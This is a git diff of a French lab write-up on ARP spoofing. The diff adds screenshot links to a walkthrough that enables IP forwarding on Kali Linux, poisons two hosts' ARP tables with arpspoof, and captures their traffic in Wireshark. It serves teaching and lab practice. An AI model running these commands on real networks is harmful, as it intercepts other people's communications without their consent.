@@ -86,6 +86,7 @@ GNS3) ou à un point d'accès sans fil. Le nœud attaquant sera la machine sur l
 système d'exploitation « Kali Linux »
 
 > les tables arp apres l'attaque 
+![WhatsApp Image 2022-01-09 at 1 34 41 PM (1)](https://user-images.githubusercontent.com/85891554/148683986-43cd377d-b2d6-4ffa-9faa-92c455682e79.jpeg)
 ## Etape 1 : activer le routage dans le nœud attaquant (Kali Linux)
 Tester si le routage est activé en utilisant la commande sysctl ou en cherchant la valeur de ip_forward
 dans /proc/sys/ipv4
@@ -98,6 +99,7 @@ Activer le routage :
  ```cpp
  root# sysctl -w net.ipv4.ip_forward=1
  ```
+ ![WhatsApp Image 2022-01-09 at 1 34 40 PM](https://user-images.githubusercontent.com/85891554/148683977-f164ced7-6431-496b-b188-84eca5fa7282.jpeg)
  ## Etape 2 : empoisonner les tables ARP des nœuds victimes
  Lancer une communication entre les deux nœuds légtimes (exemple : ping) puis afficher le contenu de 
 leur table arp (arp -a). Exécuter, ensuite, l'attaque arpspoof.
@@ -106,9 +108,12 @@ leur table arp (arp -a). Exécuter, ensuite, l'attaque arpspoof.
 root#arpspoof -i eth0 -t 192.168.1.3 192.168.1.4
 root#arpspoof -i eth0 -t 192.168.1.4 192.168.1.3
 ```
+![WhatsApp Image 2022-01-09 at 1 34 39 PM](https://user-images.githubusercontent.com/85891554/148683990-821599f6-b064-40c2-aa23-ed6c57d0dc78.jpeg)
 on utilise Wireshark pour afficher le trafic capturé par l'attaquant
 ```cpp
 root#wireshark
 ```
-
+![WhatsApp Image 2022-01-09 at 1 34 41 PM](https://user-images.githubusercontent.com/85891554/148683982-89957d90-bcec-4a83-b30d-ee870fa679ca.jpeg)
 les tables arp apres l'attaque 
+
+
